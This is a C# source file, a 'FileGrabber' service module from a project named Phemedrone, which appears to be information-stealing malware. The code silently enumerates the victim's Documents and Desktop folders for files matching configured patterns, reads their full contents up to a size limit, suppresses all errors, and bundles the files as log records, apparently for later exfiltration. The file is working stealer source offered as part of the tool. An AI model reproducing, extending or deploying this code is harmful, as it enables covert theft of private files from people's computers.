using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class FileGrabber : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;
        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            var totalSize = 0L;
            try
            {
                foreach (var pattern in Config.FilePatterns.TakeWhile(pattern =>
                             totalSize <= Config.GrabberFileSize * 1024 * 1024))
                {
                    foreach (var file in new[]
                             {
                                 Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                                 Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
                             }.SelectMany(dir => FileManager.EnumerateFiles(dir, pattern, Config.GrabberDepth)))
                    {
                        totalSize += new FileInfo(file).Length;
                        if (totalSize > Config.GrabberFileSize * 1024 * 1024) break;
                        ServiceCounter.FilesCount++;
                        var content = NullableValue.Call(() => File.ReadAllBytes(file));
                        if (content == null) continue;
                        var split = file.Split(new[] { Environment.UserName }, StringSplitOptions.None)
                            .ToList();
                        split.Remove(split.First());
                        array.Add(new LogRecord()
                        {
                            Path = "FileGrabber" + string.Join("/", split),
                            Content = content
                        });
                    }
                }
            }
            catch
            {
                // ignored
            }

            return array.ToArray();

        }
    }
}